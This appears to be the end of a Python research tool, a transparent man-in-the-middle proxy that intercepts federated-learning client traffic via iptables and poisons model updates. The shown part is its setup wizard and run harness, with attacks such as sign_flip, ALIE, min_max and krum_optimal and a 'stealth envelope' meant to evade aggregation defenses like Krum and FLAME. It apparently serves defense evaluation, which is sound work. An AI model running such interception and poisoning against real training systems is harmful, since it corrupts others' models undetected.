    except Exception:
        pass
    return "wlo1"


def _find_free_port_wizard(start: int = 9090) -> int:
    for port in range(start, start + 100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.close()
            return port
        except OSError:
            continue
    return start


def _ask(prompt: str, default: str) -> str:
    """Print a prompt with a default and return the user's answer (or default)."""
    try:
        answer = input(f"  {prompt} [{default}]: ").strip()
        return answer if answer else default
    except (EOFError, KeyboardInterrupt):
        print()
        return default


def _ask_bool(prompt: str, default: bool) -> bool:
    default_str = "Y/n" if default else "y/N"
    try:
        answer = input(f"  {prompt} [{default_str}]: ").strip().lower()
        if not answer:
            return default
        return answer in ("y", "yes", "1", "true")
    except (EOFError, KeyboardInterrupt):
        print()
        return default


def _ask_choice(prompt: str, choices: list, default: str) -> str:
    options = "/".join(f"[{c}]" if c == default else c for c in choices)
    try:
        while True:
            answer = input(f"  {prompt} ({options}): ").strip().lower()
            if not answer:
                return default
            if answer in choices:
                return answer
            print(f"    Please enter one of: {', '.join(choices)}")
    except (EOFError, KeyboardInterrupt):
        print()
        return default


def _ask_menu(prompt: str, choices: list, default: str) -> str:
    """Numbered-menu variant of _ask_choice — answer with a number instead of
    typing the option out. Enter accepts the marked default; a typed option
    name still works too."""
    default_idx = choices.index(default) + 1 if default in choices else 1
    print(f"  {prompt}:")
    for i, c in enumerate(choices, 1):
        marker = "  (default)" if c == default else ""
        print(f"    {i}. {c}{marker}")
    try:
        while True:
            answer = input(f"  Choice [{default_idx}]: ").strip()
            if not answer:
                return default
            if answer.isdigit() and 1 <= int(answer) <= len(choices):
                return choices[int(answer) - 1]
            if answer.lower() in choices:
                return answer.lower()
            print(f"    Enter a number 1-{len(choices)}")
    except (EOFError, KeyboardInterrupt):
        print()
        return default


def interactive_wizard() -> argparse.Namespace:
    """
    Interactive startup wizard — asks only the settings that matter.
    All network values are auto-detected first; you just confirm or override.
    """
    print()
    print("=" * 60)
    print("  FL POISON PROXY — interactive setup")
    print("=" * 60)
    print("  Auto-detecting network settings…")

    iface      = _detect_interface_auto()
    proxy_port = _find_free_port_wizard(9090)
    iface_ip, iface_cidr = detect_interface_ipv4(iface)
    subnet     = cidr_to_network(iface_cidr) if iface_cidr else "10.42.0.0/24"
    print()

    # ── Network (hard-coded — edit these lines to change, no longer prompted) ──
    server_ip   = "10.42.0.195"
    server_port = 8080
    capture_dir = "captures_live_poison"
    print("── Network (hard-coded defaults; edit interactive_wizard() to change) ──")
    print(f"  Interface:     {iface}  ({iface_ip})")
    print(f"  Proxy port:    {proxy_port}")
    print(f"  FL server:     {server_ip}:{server_port}")
    print(f"  Client subnet: {subnet}")
    print(f"  Capture dir:   {capture_dir}")

    print()
    print("── Experimental control and post-hoc linkage ───────────")
    print("  The proxy log is the ground-truth source for what was actually")
    print("  modified. Experiment/run IDs may be copied from the server console.")
    experiment_id = _ask("Server experiment ID (blank allowed)", "")
    run_id = _ask("Server run ID (blank allowed)", "")
    condition = ""
    wizard_timestamp = time.strftime('%Y%m%d_%H%M%S')
    attack_event_log = f"proxy_attack_events_{wizard_timestamp}.csv"
    proxy_run_manifest = f"proxy_run_manifest_{wizard_timestamp}.json"
    proxy_resource_log = f"proxy_resource_log_{wizard_timestamp}.csv"
    resource_log_interval_s = 1.0
    repair_preexisting_flows = True
    abort_on_preexisting_flows = True

    # ── Attack ───────────────────────────────────────────────────────
    print()
    print("── Attack settings ──────────────────────────────────────")
    live_poison = True

    phase_gate_enabled = True
    phase_gate_min_confidence = 0.85
    phase_gate_max_age_s = 90.0
    phase_gate_require_client = True
    phase_gate_reject_sources = "server_announce"
    require_update_space = True
    global_model_max_age_s = 600.0
    require_global_round_match = False
    download_phase_min_confidence = 0.70
    model_cache_entries_per_client = 12
    model_cache_memory_mb = 128
    model_cache_dir = ".proxy_model_cache"
    model_cache_disk_gb = 20.0
    model_min_float_arrays = 2
    model_min_elements = 1000
    update_sparsity_epsilon = 1e-8

    attack      = "sign_flip"
    alpha       = 3.0
    live_clip_ratio = 0.3
    end_msg     = -1
    poison_clients = ""
    poison_target_mode = "static"
    warmup      = 20
    warmup_rounds = 3
    # Envelope (stealth) defaults
    env_aggressiveness = 0.5
    env_raw_attack     = "sign_flip"
    env_k_coord        = 3.0
    env_k_norm         = 3.0
    env_state_path     = ""
    env_window         = 5
    env_ramp_rounds    = 5
    env_adaptive_stealth = True
    env_backoff_step   = 0.1
    env_min_peers      = 2
    env_peer_min_obs   = 3
    env_derived_f      = 1
    env_multi_krum_m   = 1
    env_trimmed_beta   = 0.1
    env_flame_cosine_threshold = 0.1
    env_active_defense = "flame"
    env_geometry_sketch_dim = 8192
    env_peer_memory_mb = 512
    env_peer_full_block_max_mb = 16
    env_state_save_every = 0
    env_large_model_float32_threshold_elements = 2000000

    if live_poison:
        print()
        print("  ── Update-space matching (hard-coded defaults) ──")
        print("  The gate opens only on a fresh analyzer MODEL_UPLOAD/upload signal.")
        phase_gate_enabled = True
        require_update_space = True
        global_model_max_age_s = 600.0
        require_global_round_match = False
        download_phase_min_confidence = 0.70
        update_sparsity_epsilon = 1e-8
        warmup_rounds = 0

        attack = "envelope"
        print()
        print("  ── Envelope (stealth) settings ──")
        print("  Observes benign updates first, then poisons + projects into")
        print("  the learned benign envelope. Sweep aggressiveness to trace the")
        print("  stealth-vs-effect frontier (0 = max stealth, 1 = raw poison).")
        env_window = 5
        warmup = 20
        env_raw_attack = _ask_menu("Poison technique",
                                    ["sign_flip", "scale", "noise", "ALIE",
                                     "min_max", "min_sum", "IPM", "krum_optimal"],
                                    "sign_flip")
        if env_raw_attack in ("min_sum", "krum_optimal"):
            env_aggressiveness = 1.0    # full feasible boundary
        else:
            env_aggressiveness = 0.5    # matches historical FedAvg/Krum/Multi-Krum runs
        if env_raw_attack in ("sign_flip", "scale"):
            alpha = 0.5                 # matches historical FedAvg/Krum/Multi-Krum runs
        if env_raw_attack == "IPM":
            alpha = 1.0
        if env_raw_attack in ("ALIE", "min_max", "min_sum", "IPM", "krum_optimal"):
            print(f"  {env_raw_attack} is peer-based: it needs peer visibility and is")
            print("  crafted at the defense boundary (not re-projected).")
            env_derived_f = 1
            env_multi_krum_m = 1
        env_ramp_rounds = 5
        env_adaptive_stealth = True
        if env_adaptive_stealth or env_raw_attack == "krum_optimal":
            env_active_defense = _ask_menu(
                "Active server defense for the local oracle",
                ["fedavg", "krum", "multi_krum", "median",
                 "trimmed_mean", "bulyan", "flame", "auto"],
                "krum" if env_raw_attack == "krum_optimal" else "flame",
            )
        env_min_peers = 2
        env_peer_memory_mb = 512
        env_peer_full_block_max_mb = 16
        env_geometry_sketch_dim = 8192
        env_state_path = ""
        print("  NOTE: if the state file already exists with a finished warm-up,")
        print("        the proxy resumes in ATTACK mode and skips warm-up.")

        end_msg = -1
        print()
        print("  ── Poison targeting (for defense evaluation) ──")
        print("  The analyzer publishes per-client phase/status for all clients.")
        print("  The proxy target list decides which of those clients may be attacked.")
        print("  Enter one IP, multiple comma-separated IPs, or ALL. Leave blank to")
        print("  attack no client until a target list is supplied on the command line.")
        poison_clients = _ask(
            "Client IPs to attack (CSV; blank = none; ALL = all)", "").strip()
        if poison_clients.strip().lower() in {"all", "*"}:
            poison_target_mode = "all"
        elif poison_clients.strip():
            poison_target_mode = "static"
        else:
            poison_target_mode = "static"

    # ── Summary ──────────────────────────────────────────────────────
    print()
    print("── Configuration summary ────────────────────────────────")
    print(f"  Interface:      {iface}  ({iface_ip})")
    print(f"  Client subnet:  {subnet}")
    print(f"  FL server:      {server_ip or '(from sniffer)'}:{server_port}")
    print(f"  Proxy port:     {proxy_port}")
    print(f"  Capture dir:    {capture_dir}")
    print(f"  Attack events:  {attack_event_log}")
    print(f"  Proxy manifest: {proxy_run_manifest}")
    print(f"  Resource log:   {proxy_resource_log}")
    print(f"  Experiment ID:  {experiment_id or '(not supplied)'}")
    print(f"  Run ID:         {run_id or '(not supplied)'}")
    print(f"  Condition:      {condition or '(not supplied)'}")
    print(f"  Conntrack fix:  {'enabled' if repair_preexisting_flows else 'disabled'}; "
          f"abort-on-remain={'yes' if abort_on_preexisting_flows else 'no'}")
    if live_poison and attack == "clip":
        print(f"  Live poison:    YES — norm_constrained_sign_flip  clip_ratio={live_clip_ratio}  raw=sign_flip")
    else:
        print(f"  Live poison:    {'YES — ' + attack + '  alpha=' + str(alpha) if live_poison else 'NO (capture only)'}")
    if live_poison:
        print(f"  Phase gate:     {'enabled' if phase_gate_enabled else 'disabled'}; "
              f"confidence>={phase_gate_min_confidence}; age<={phase_gate_max_age_s}s; "
              f"client-specific={'yes' if phase_gate_require_client else 'no'}; "
              f"warmup_rounds={warmup_rounds}")
        print(f"  Update space:   required={'yes' if require_update_space else 'no'}; "
              f"global-age<={global_model_max_age_s}s; "
              f"exact-round={'yes' if require_global_round_match else 'no'}")
    if live_poison and attack == "envelope":
        print(f"  Envelope mode:  warmup={warmup}  aggressiveness={env_aggressiveness}  "
              f"raw={env_raw_attack}  window={env_window}")
        print(f"                  ramp_rounds={env_ramp_rounds}  adaptive_stealth={env_adaptive_stealth}  "
              f"active_defense={env_active_defense}")
        print(f"                  min_peers={env_min_peers}  peer_memory_mb={env_peer_memory_mb}  "
              f"peer_full_max_mb={env_peer_full_block_max_mb}  sketch_dim={env_geometry_sketch_dim}")
        print(f"                  f={env_derived_f}  m={env_multi_krum_m}")
        print(f"  Envelope state: {env_state_path or '(none — fresh each run)'}  "
              f"save_every={env_state_save_every}")
    if live_poison and end_msg >= 0:
        print(f"  Poison range:   messages 0 – {end_msg}")
    if live_poison:
        if poison_target_mode == "all":
            target_summary = "ALL clients"
        elif poison_clients:
            target_summary = f"static CSV: {poison_clients}"
        else:
            target_summary = "no clients configured"
        print(f"  Poison targets: {target_summary}")
    print("  Transport:      dynamic contract discovery; no model-specific soft size cap")
    print("                  >32 MiB messages disk-spooled; hard safety ceiling=8 GiB")
    print("                  balanced HTTP/2 flow credit enabled for withheld uploads")
    print("  Model cache:    <=128 MiB in RAM; larger global models mmap-backed on disk")
    print("  Dashboard:      automatic on localhost (preferred port 8765)")
    print()

    ok = _ask_bool("Start with these settings?", True)
    if not ok:
        print("Aborted. Re-run to try again.")
        raise SystemExit(0)

    # ── Build a Namespace identical to what parse_args() would return ─
    args = parse_args.__wrapped__() if hasattr(parse_args, "__wrapped__") else \
           argparse.Namespace()

    # Set every field parse_args defines, using wizard answers where applicable
    args.interface             = iface
    args.listen_host           = "0.0.0.0"
    args.proxy_port            = proxy_port
    args.target_server_ip      = server_ip
    args.target_server_port    = server_port
    args.client_subnet         = subnet
    args.allowed_clients       = ""
    args.blocked_clients       = ""
    args.poison_clients        = poison_clients
    args.poison_target_mode    = poison_target_mode
    args.server_learn_host     = "127.0.0.1"
    args.server_learn_port     = 7007
    args.server_learn_timeout  = 60.0
    args.allow_server_update   = False
    args.install_iptables      = True
    args.cleanup_interfaces    = ""
    args.cleanup_tc            = True
    args.cleanup_mangle        = True
    args.flush_conntrack       = False
    args.repair_preexisting_flows = repair_preexisting_flows
    args.abort_on_preexisting_flows = abort_on_preexisting_flows
    args.protocol              = "auto"
    args.max_connections       = 128
    args.max_connections_per_client = 32
    args.socket_timeout        = 120.0
    args.max_message_mb        = 0
    args.hard_max_message_gb   = 8.0
    args.spool_threshold_mb    = 32
    args.spool_dir             = ".proxy_spool"
    args.spool_disk_reserve_mb = 1024
    args.adaptive_flow_control = True
    args.capture_streams       = True
    args.capture_dir           = capture_dir
    args.capture_max_bytes     = 0
    args.log_interval          = 5.0
    args.dashboard            = True
    args.dashboard_host       = "127.0.0.1"
    args.dashboard_port       = 8765
    args.experiment_id         = experiment_id
    args.run_id                = run_id
    args.condition             = condition
    args.proxy_run_id          = f"proxy_{int(time.time())}"
    args.attack_event_log      = attack_event_log
    args.proxy_run_manifest    = proxy_run_manifest
    args.proxy_resource_log    = proxy_resource_log
    args.resource_log_interval_s = resource_log_interval_s
    args.phase_gate_enabled     = phase_gate_enabled
    args.phase_gate_min_confidence = phase_gate_min_confidence
    args.phase_gate_max_age_s   = phase_gate_max_age_s
    args.phase_gate_ignore_age  = False
    args.phase_gate_require_client = phase_gate_require_client
    args.phase_gate_reject_sources = phase_gate_reject_sources
    args.require_update_space   = require_update_space
    args.global_model_max_age_s = global_model_max_age_s
    args.require_global_round_match = require_global_round_match
    args.download_phase_min_confidence = download_phase_min_confidence
    args.model_cache_entries_per_client = model_cache_entries_per_client
    args.model_cache_memory_mb = model_cache_memory_mb
    args.model_cache_dir = model_cache_dir
    args.model_cache_disk_gb = model_cache_disk_gb
    args.model_min_float_arrays = model_min_float_arrays
    args.model_min_elements     = model_min_elements
    args.update_sparsity_epsilon = update_sparsity_epsilon
    args.live_poison           = live_poison
    args.live_attack           = attack
    args.live_alpha            = alpha
    args.live_clip_ratio       = live_clip_ratio
    args.live_sigma            = 0.01
    args.live_seed             = 1234
    args.live_start_message    = 0
    args.live_end_message      = end_msg
    args.live_max_arrays_per_message = 0
    args.live_include_nonfloat = False
    args.live_log_every        = 50
    # Envelope (stealth) attack-mode settings — from wizard answers.
    args.live_warmup             = warmup
    args.live_warmup_rounds      = warmup_rounds
    args.live_aggressiveness     = env_aggressiveness
    args.live_raw_attack         = env_raw_attack
    args.live_k_coord            = env_k_coord
    args.live_k_norm             = env_k_norm
    args.live_window             = env_window
    args.live_ramp_rounds        = env_ramp_rounds
    args.live_adaptive_stealth   = env_adaptive_stealth
    args.live_backoff_step       = env_backoff_step
    args.live_min_peers          = env_min_peers
    args.live_peer_min_obs       = env_peer_min_obs
    args.live_derived_f          = env_derived_f
    args.live_multi_krum_m       = env_multi_krum_m
    args.live_trimmed_beta       = env_trimmed_beta
    args.live_flame_cosine_threshold = env_flame_cosine_threshold
    args.live_active_defense     = env_active_defense
    args.live_geometry_sketch_dim = env_geometry_sketch_dim
    args.live_peer_memory_mb     = env_peer_memory_mb
    args.live_peer_full_block_max_mb = env_peer_full_block_max_mb
    args.live_state_save_every   = env_state_save_every
    args.live_large_model_float32_threshold_elements = env_large_model_float32_threshold_elements
    args.live_engine_cache_dir   = ".stealth_engine_cache"
    args.live_engine_disk_threshold_mb = 256.0
    args.live_large_model_adaptive_backoff_steps = 0
    args.live_envelope_state     = env_state_path
    args.reset_envelope_state   = True
    args.attack_after          = 2
    args.attack_strength       = 3.0
    args.attack_type           = "reversal"
    args.verbose               = False
    return args



def _resolve_proxy_output_paths(args: argparse.Namespace) -> None:
    stamp = time.strftime("%Y%m%d_%H%M%S")
    if not str(getattr(args, "proxy_run_id", "") or "").strip():
        args.proxy_run_id = f"proxy_{int(time.time())}"

    # Default transient/cache directories are isolated per run so an old CNN,
    # autoencoder, or transformer contract cannot contaminate a later run.
    if str(getattr(args, "spool_dir", ".proxy_spool") or ".proxy_spool") == ".proxy_spool":
        args.spool_dir = str(Path(".proxy_spool") / str(args.proxy_run_id))
    if str(getattr(args, "model_cache_dir", ".proxy_model_cache") or ".proxy_model_cache") == ".proxy_model_cache":
        args.model_cache_dir = str(Path(".proxy_model_cache") / str(args.proxy_run_id))
    if str(getattr(args, "live_engine_cache_dir", ".stealth_engine_cache") or ".stealth_engine_cache") == ".stealth_engine_cache":
        args.live_engine_cache_dir = str(Path(".stealth_engine_cache") / str(args.proxy_run_id))

    if not str(getattr(args, "attack_event_log", "") or "").strip():
        args.attack_event_log = f"proxy_attack_events_{stamp}.csv"
    if not str(getattr(args, "proxy_run_manifest", "") or "").strip():
        args.proxy_run_manifest = f"proxy_run_manifest_{stamp}.json"
    if not str(getattr(args, "proxy_resource_log", "") or "").strip():
        args.proxy_resource_log = f"proxy_resource_log_{stamp}.csv"


def _envelope_state_fingerprints(args: argparse.Namespace) -> dict:
    raw_path = str(getattr(args, "live_envelope_state", "") or "").strip()
    if not raw_path:
        return {"configured_path": None, "files": {}}
    base = Path(raw_path).expanduser()
    candidates = []
    if base.suffix:
        candidates.extend(sorted(base.parent.glob(f"{base.stem}_*{base.suffix}")))
        if base.exists():
            candidates.append(base)
    elif base.exists() and base.is_dir():
        candidates.extend(sorted(base.glob("envelope_*.pkl")))
    unique = []
    seen = set()
    for candidate in candidates:
        key = str(candidate.resolve())
        if key not in seen and candidate.is_file():
            seen.add(key)
            unique.append(candidate)
    return {
        "configured_path": str(base.resolve()),
        "files": {
            str(path.resolve()): optional_file_sha256(path)
            for path in unique
        },
    }


def _proxy_configuration_snapshot(args: argparse.Namespace) -> dict:
    fields = [
        "interface", "listen_host", "proxy_port", "target_server_ip",
        "target_server_port", "client_subnet", "protocol",
        "max_message_mb", "hard_max_message_gb", "spool_threshold_mb",
        "spool_dir", "spool_disk_reserve_mb", "adaptive_flow_control",
        "capture_streams",
        "capture_dir", "experiment_id", "run_id", "condition", "proxy_run_id",
        "attack_event_log", "phase_gate_enabled", "phase_gate_min_confidence",
        "phase_gate_max_age_s", "phase_gate_ignore_age", "phase_gate_require_client",
        "phase_gate_reject_sources", "require_update_space", "global_model_max_age_s",
        "require_global_round_match", "download_phase_min_confidence",
        "model_cache_entries_per_client", "model_cache_memory_mb",
        "model_cache_dir", "model_cache_disk_gb",
        "update_sparsity_epsilon", "live_poison", "live_attack", "live_alpha",
        "live_clip_ratio", "live_sigma", "live_seed", "live_start_message",
        "live_end_message", "live_warmup", "live_warmup_rounds",
        "live_aggressiveness", "live_raw_attack", "live_k_coord", "live_k_norm",
        "live_window", "live_ramp_rounds", "live_adaptive_stealth",
        "live_backoff_step", "live_min_peers", "live_peer_min_obs",
        "live_derived_f", "live_multi_krum_m", "live_trimmed_beta",
        "live_flame_cosine_threshold", "live_active_defense",
        "live_geometry_sketch_dim", "live_peer_memory_mb",
        "live_peer_full_block_max_mb", "live_state_save_every",
        "live_large_model_float32_threshold_elements", "live_engine_cache_dir",
        "live_engine_disk_threshold_mb", "live_large_model_adaptive_backoff_steps",
        "non_target_observation_queue_frames",
        "poison_clients", "poison_target_mode",
        "live_envelope_state", "reset_envelope_state", "repair_preexisting_flows",
        "abort_on_preexisting_flows", "resource_log_interval_s",
    ]
    return {field: getattr(args, field, None) for field in fields}


def write_proxy_run_manifest(args: argparse.Namespace, status: str, *, started_at: float, error: str = "") -> None:
    base_dir = Path(__file__).resolve().parent
    code_candidates = [
        Path(__file__).resolve(),
        base_dir / "analyzer.py",
        base_dir / "stealth_engine.py",
        base_dir / "stealth_projection.py",
        base_dir / "defense_oracle.py",
        base_dir / "selection_attacks.py",
        base_dir / "peer_fingerprint.py",
        base_dir / "envelope.py",
        base_dir / "array_contract.py",
        base_dir / "experiment_integrity.py",
        base_dir / "model_agnostic_support.py",
    ]
    payload = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "status": status,
        "error": error or None,
        "started_at_epoch_s": started_at,
        "ended_at_epoch_s": time.time() if status != "started" else None,
        "duration_s": max(0.0, time.time() - started_at),
        "experiment_id": str(getattr(args, "experiment_id", "") or ""),
        "run_id": str(getattr(args, "run_id", "") or ""),
        "condition": str(getattr(args, "condition", "") or ""),
        "proxy_run_id": str(getattr(args, "proxy_run_id", "") or ""),
        "canonical_update_hash_scheme": CANONICAL_HASH_SCHEME,
        "model_contract_hash_scheme": MODEL_CONTRACT_HASH_SCHEME,
        "transport_architecture_policy": "dynamic_tensor_contract_plus_adaptive_disk_spool_plus_balanced_http2_flow_credit",
        "configuration": _proxy_configuration_snapshot(args),
        "runtime_environment": runtime_environment_snapshot({"proxy_live_seed": getattr(args, "live_seed", None)}),
        "runtime_preflight": getattr(args, "_runtime_preflight", {}),
        "code_fingerprints": collect_code_fingerprints(code_candidates),
        "envelope_state": {
            "before_reset": getattr(args, "_envelope_state_before_reset", {}),
            "current": _envelope_state_fingerprints(args),
            "reset_at_start": bool(getattr(args, "reset_envelope_state", True)),
        },
        "outputs": {
            "attack_event_log": str(Path(getattr(args, "attack_event_log", "")).expanduser().resolve()),
            "resource_log": str(Path(getattr(args, "proxy_resource_log", "")).expanduser().resolve()),
        },
    }
    atomic_json_dump(getattr(args, "proxy_run_manifest"), payload)


def reset_envelope_state_at_start(args: argparse.Namespace) -> None:
    """Delete persisted per-client update-envelope calibration for a fresh run."""
    if not bool(getattr(args, "live_poison", False)):
        return
    if str(getattr(args, "live_attack", "")).lower() != "envelope":
        return
    if not bool(getattr(args, "reset_envelope_state", True)):
        logger.warning(
            "[UPDATE-SPACE] state reset disabled; calibration may resume from a prior run"
        )
        return

    raw_path = str(getattr(args, "live_envelope_state", "") or "").strip()
    if not raw_path:
        logger.info("[UPDATE-SPACE] fresh in-memory envelope; no state path configured")
        return

    base = Path(raw_path).expanduser()
    candidates = []
    if base.suffix:
        candidates.extend(base.parent.glob(f"{base.stem}_*{base.suffix}"))
        candidates.append(base)
    else:
        candidates.extend(base.glob("envelope_*.pkl")) if base.exists() else None

    removed = 0
    try:
        for candidate in candidates:
            if candidate.exists() and candidate.is_file():
                candidate.unlink()
                removed += 1
        logger.info("[UPDATE-SPACE] removed %d prior per-client state file(s)", removed)
    except Exception as exc:
        raise SystemExit(f"Could not reset update-envelope state at {base}: {exc}") from exc


def validate_runtime_dependencies(args: argparse.Namespace) -> dict:
    """Fail fast before touching traffic when a requested runtime is incomplete.

    Earlier versions silently relayed CNN uploads unchanged when the envelope
    engine was missing. V27 refuses to start an envelope experiment in that
    state so an invalid 200-round run cannot be mistaken for an attack run.
    """
    report = {
        "array_contract_available": bool(_ARRAY_CONTRACT_AVAILABLE),
        "stealth_engine_available": bool(_STEALTH_AVAILABLE),
        "stealth_import_error": str(_STEALTH_IMPORT_ERROR or ""),
        "peer_fingerprint_available": bool(_PEER_FINGERPRINT_AVAILABLE),
        "peer_fingerprint_import_error": str(_PEER_FINGERPRINT_IMPORT_ERROR or ""),
    }
    if not bool(getattr(args, "live_poison", False)):
        return report
    if str(getattr(args, "live_attack", "")).lower() != "envelope":
        return report

    errors = []
    if not _ARRAY_CONTRACT_AVAILABLE:
        errors.append("array_contract.py could not be imported")
    if not _STEALTH_AVAILABLE:
        errors.append(
            "stealth_engine.py/runtime dependencies unavailable: "
            + str(_STEALTH_IMPORT_ERROR or "unknown import error")
        )
    if int(getattr(args, "live_min_peers", 0) or 0) > 0 and not _PEER_FINGERPRINT_AVAILABLE:
        errors.append(
            "peer_fingerprint.py unavailable while peer envelope is enabled: "
            + str(_PEER_FINGERPRINT_IMPORT_ERROR or "unknown import error")
        )

    active = str(getattr(args, "live_active_defense", "flame") or "flame").lower()
    raw_attack = str(getattr(args, "live_raw_attack", "") or "").lower()
    if raw_attack == "krum_optimal" and active not in {"krum", "multi_krum"}:
        errors.append(
            "krum_optimal is defined for Krum or Multi-Krum selection, but "
            f"live_active_defense={active!r}. Use a Krum/Multi-Krum server or choose "
            "a FedAvg-appropriate poisoning attack."
        )

    if errors:
        raise SystemExit(
            "Envelope runtime preflight FAILED. Fix the active folder before running:\n- "
            + "\n- ".join(errors)
        )

    if active == "auto":
        logger.warning(
            "[PREFLIGHT] live_active_defense=auto evaluates all oracle defenses; "
            "for CNN/transformer experiments choose the actual server defense to reduce overhead"
        )
    logger.info(
        "[PREFLIGHT] envelope runtime OK: defense=%s sketch_dim=%s peer_budget_mb=%s state_save_every=%s",
        active,
        getattr(args, "live_geometry_sketch_dim", 8192),
        getattr(args, "live_peer_memory_mb", 512),
        getattr(args, "live_state_save_every", 0),
    )
    return report


def main() -> None:
    # If the user passed any CLI flags, use them as before.
    # If they ran with no arguments, launch the interactive wizard.
    import sys as _sys
    if len(_sys.argv) > 1:
        args = parse_args()
    else:
        args = interactive_wizard()

    _resolve_proxy_output_paths(args)
    args._runtime_preflight = validate_runtime_dependencies(args)
    started_at = time.time()
    args._envelope_state_before_reset = _envelope_state_fingerprints(args)
    reset_envelope_state_at_start(args)
    write_proxy_run_manifest(args, "started", started_at=started_at)

    resource_monitor = ResourceCSVMonitor(
        args.proxy_resource_log,
        interval_s=max(0.2, float(getattr(args, "resource_log_interval_s", 1.0))),
    )
    resource_monitor.start()

    app = TransparentProxyApp(args)
    atexit.register(lambda: app.cleaner.cleanup("atexit"))

    def on_signal(signum, _frame):
        name = signal.Signals(signum).name
        app.request_stop(name)

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    final_status = "completed"
    final_error = ""
    try:
        app.start()
    except KeyboardInterrupt:
        final_status = "interrupted"
        app.request_stop("keyboard_interrupt")
    except SystemExit:
        final_status = "system_exit"
        raise
    except Exception as exc:
        final_status = "failed"
        final_error = repr(exc)
        logger.error("Fatal error: %s", exc)
        raise
    finally:
        if _flush_stealth_manager_state is not None and str(getattr(args, "live_envelope_state", "") or "").strip():
            try:
                _flush_stealth_manager_state(args)
            except Exception as state_exc:
                logger.error("Could not flush envelope state at shutdown: %s", state_exc)
        if _cleanup_stealth_manager_cache is not None:
            try:
                _cleanup_stealth_manager_cache(args)
            except Exception as cache_exc:
                logger.error("Could not clean stealth-engine cache at shutdown: %s", cache_exc)
        resource_monitor.stop()
        app.cleaner.cleanup("final_exit")
        try:
            write_proxy_run_manifest(
                args, final_status, started_at=started_at, error=final_error
            )
        except Exception as manifest_exc:
            logger.error("Could not finalize proxy run manifest: %s", manifest_exc)


if __name__ == "__main__":
    main()
